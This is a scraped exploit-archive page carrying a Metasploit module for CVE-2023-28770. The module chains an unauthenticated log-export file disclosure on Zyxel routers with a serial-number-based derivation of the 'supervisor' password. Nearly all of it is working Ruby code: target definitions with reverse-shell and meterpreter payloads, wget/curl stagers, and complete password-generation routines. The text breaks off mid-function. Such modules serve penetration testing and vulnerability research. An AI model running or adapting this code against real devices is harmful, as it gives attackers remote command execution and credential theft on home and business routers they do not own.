---
title: Zyxel Chained Remote Code Execution exploit
url: https://sploitus.com/exploit?id=PACKETSTORM:172277&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-05-11
fetch_date: 2025-10-04T11:36:50.725980
---

# Zyxel Chained Remote Code Execution exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# Exploit for Zyxel Chained Remote Code Execution CVE-2023-28770

2023-05-10 | CVSS 7.5

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=PACKETSTORM:172277
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'socket'
require 'digest/md5'

class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking

include Msf::Exploit::Remote::HttpClient
include Msf::Exploit::Remote::SSH
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck

attr_accessor :ssh_socket

def initialize(info = {})
super(
update_info(
info,
'Name' => 'Zyxel chained RCE using LFI and weak password derivation algorithm',
'Description' => %q{
This module exploits multiple vulnerabilities in the `zhttpd` binary (/bin/zhttpd)
and `zcmd` binary (/bin/zcmd). It is present on more than 40 Zyxel routers and CPE devices.
The remote code execution vulnerability can be exploited by chaining the local file disclosure
vulnerability in the zhttpd binary that allows an unauthenticated attacker to read the entire configuration
of the router via the vulnerable endpoint `/Export_Log?/data/zcfg_config.json`.
With this information disclosure, the attacker can determine if the router is reachable via ssh
and use the second vulnerability in the `zcmd` binary to derive the `supervisor` password exploiting
a weak implementation of a password derivation algorithm using the device serial number.

After exploitation, an attacker will be able to execute any command as user `supervisor`.
},
'License' => MSF_LICENSE,
'Author' => [
'h00die-gr3y <h00die.gr3y[at]gmail.com>', # Author of exploit chain and MSF module contributor
'SEC Consult Vulnerability Lab',
'Thomas Rinsma',
'Bogi Napoleon Wennerstrøm'
],
'References' => [
['CVE', '2023-28770'],
['URL', 'https://r.sec-consult.com/zyxsploit'],
['URL', 'https://sec-consult.com/vulnerability-lab/advisory/multiple-critical-vulnerabilities-in-multiple-zyxel-devices/'],
['URL', 'https://th0mas.nl/2020/03/26/getting-root-on-a-zyxel-vmg8825-t50-router/'],
['URL', 'https://github.com/boginw/zyxel-vmg8825-keygen'],
['URL', 'https://attackerkb.com/topics/tPAvkwQgDK/cve-2023-28770']
],
'DisclosureDate' => '2022-02-01',
'Platform' => ['unix', 'linux'],
'Arch' => [ARCH_CMD, ARCH_MIPSBE],
'Privileged' => true,
'Targets' => [
[
'Unix Command',
{
'Platform' => 'unix',
'Arch' => ARCH_CMD,
'Type' => :unix_cmd,
'DefaultOptions' => {
'PAYLOAD' => 'cmd/unix/reverse_netcat'
}
}
],
[
'Linux Dropper',
{
'Platform' => 'linux',
'Arch' => [ARCH_MIPSBE],
'Type' => :linux_dropper,
'CmdStagerFlavor' => ['printf', 'echo', 'bourne', 'wget', 'curl'],
'DefaultOptions' => {
'PAYLOAD' => 'linux/mipsbe/meterpreter/reverse_tcp'
}
}
],
[
'Interactive SSH',
{
'DefaultOptions' => {
'PAYLOAD' => 'generic/ssh/interact'
},
'Payload' => {
'Compat' => {
'PayloadType' => 'ssh_interact'
}
}
}
]
],
'DefaultTarget' => 0,
'DefaultOptions' => {
'RPORT' => 80,
'SSL' => false,
'SSH_TIMEOUT' => 30,
'WfsDelay' => 5
},
'Notes' => {
'Stability' => [CRASH_SAFE],
'Reliability' => [REPEATABLE_SESSION],
'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
}
)
)
register_options(
[
OptBool.new('STORE_CRED', [false, 'Store credentials into the database.', true])
]
)
register_advanced_options(
[
OptInt.new('ConnectTimeout', [ true, 'Maximum number of seconds to establish a TCP connection', 10])
]
)
end

# supervisor user password derivation functions (SerialNumMethod2 and 3) for Zyxel routers
# based on the reverse engineer analysis of Thomas Rinsma and Bogi Napoleon Wennerstrøm
# https://github.com/boginw/zyxel-vmg8825-keygen

def double_hash(input, size = 8)
# ROUND 1
# take the MD5 hash from the serial number SXXXXXXXXXXXX
# this returns a hash of 32 char bytes.
# read md5 hash per two char bytes, check if first char byte = '0', then make first byte char == second byte char
# store two char bytes in round1 and continue with next two char bytes from the hash.
md5_str_array = Digest::MD5.hexdigest(input).split(//)
round1_str_array = Array.new(32)
j = 0
until j == 32
if md5_str_array[j] == '0'
round1_str_array[j] = md5_str_array[j + 1]
else
round1_str_array[j] = md5_str_array[j]
end
round1_str_array[j + 1] = md5_str_array[j + 1]
j += 2
end
round1 = round1_str_array.join
# ROUND 2
# take the MD5 hash from the result of round1
# returns a hash of 32 char bytes.
# read md5 hash per two char bytes, check if first char byte = '0', then make first byte char == second byte char
# store two char bytes in round2 and continue with next two char bytes.
md5_str_array = Digest::MD5.hexdigest(round1).split(//)
round2_str_array = Array.new(32)
j = 0
until j == 32
if md5_str_array[j] == '0'
round2_str_array[j] = md5_str_array[j + 1]
else
round2_str_array[j] = md5_str_array[j]
end
round2_str_array[j + 1] = md5_str_array[j + 1]
j += 2
end
# ROUND 3
# take the result of round2 and pick the number (size) of char bytes starting with indice [0] and increased by 3
# to create the final password hash with defined number (size) of alphanumeric characters and return the final result
round3_str_array = Array.new(size)
for i in 0..(size - 1) do
round3_str_array[i] = round2_str_array[i * 3]
end
round3 = round3_str_array.join
return round3
end

def mod3_key_generator(seed)
# key generator function used in the SerialNumMethod3 pasword derivation function
round4_array = Array.new(16, 0)
found0s = 0
found1s = 0
found2s = 0

while (found0s == 0) || (found1s == 0) || (found2s == 0)
found0s = 0
found1s = 0
found2s = 0

power_of_2 = 1
seed += 1

for i in 0..9 do
round4_array[i] = (seed % (power_of_2 * 3) / power_of_2).floor
if (round4_array[i] == 1)
found1s += 1
elsif (round4_array[i]) == 2
found2s += 1
else
found0s += 1
end
power_of_2 = power_of_2 << 1
end
end
return seed, round4_array
end

def serial_num_method2(serial_number)
# SerialNumMethod2 password derivation function
pwd = double_hash(serial_number)
return pwd
end

def serial_num_method3(serial_number)
# SerialNumMethod3 password derivation function

# constant definitions
keystr1_byte_array = 'IO'.bytes.to_a
keystr2_byte_array = 'lo'.bytes.to_a
keystr3_byte_array = '10'.bytes.to_a
valstr_byte_array = '23456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz0123456789ABCDEF'.bytes.to_a
offset1 = 0x8
offset2 = 0x20

round3 = double_hash(serial_number, 10)
round3.upcase!
round3_byte_array = round3.bytes.to_a

md5_str = Digest::MD5.hexdigest(serial_number)
md5_str_array = md5_str.split(//)
offset = md5_str_array[2] + md5_str_array[3] + md5_str_array[4] + md5_str_array[5]

result = mod3_key_generator(offset.to_i(16))
offset = result[0]
round4 = result[1]

for i in 0..9 do
if round4[i] == 1
new_val = (((round3_byte_array[i] % 0x1a) * 0x1000000) >> 0x18) + 'A'.bytes.join.to_i
round3_byte_array[i] = new_val
for j in 0..1 do
next unless (round3_byte_array[i] == keystr1_byte_array[j])

index = offset1 + ((offset + j) % 0x18)
round3_byte_array[i] = valstr_byte_array[index]
break
end
elsif round4[i] == 2
new_val = (((round3_byte_array[i] % 0x1a) * 0x1000000) >> 0x18) + 'a'.bytes.join.to_i
round3_byte_array[i] = new_val
for j in 0..1 do
next unless (round3_byte_array[i] == keystr2_byte_array[j])

index = offset2 + ((offset + j) % 0x18)
round3_byte_array[i] = valstr_byte_array[index]
break
end
else
new_val = (((round3_byte_array[i] % 10) * 0x1000000) >> 0x18) + '0'.bytes.join.to_i
round3_byte_array[i] = new_val
for j in 0..1 do
next unless (round3_byte_array[i] == keystr3_byte_array[j])

var = ((offset + j) >> 0x1f) >> 0x1d
index = ((offset + j + var) & 7) - var
round3_byte_array[i] = valstr_byte_array[index]
break
end
end
end
pwd = round3_byte_array.pack('C*')
return pwd
end

def crack_supervisor_pwd(serial)
# crack supervisor password using the device serial number
# there are two confirmed hashing functions that can derive the supervisor password from the serial number:
# SerialNumMethod2 and SerialNumMethod3
# both passwords candidat...